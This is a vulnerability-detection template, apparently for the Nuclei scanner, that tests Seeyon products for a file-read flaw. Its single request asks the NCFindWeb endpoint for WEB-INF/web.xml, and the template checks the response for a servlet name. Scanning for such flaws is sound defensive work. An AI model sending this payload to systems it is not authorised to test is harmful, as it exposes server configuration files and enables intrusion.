id: seeyon-wooyun-file-read
info:
  name: Seeyon Wooyun File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    This template checks for a file read vulnerability in Seeyon products, as reported in Wooyun 2015 148227.
http:
  - method: GET
    path:
      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<servlet-name>NCInvokerServlet</servlet-name>"
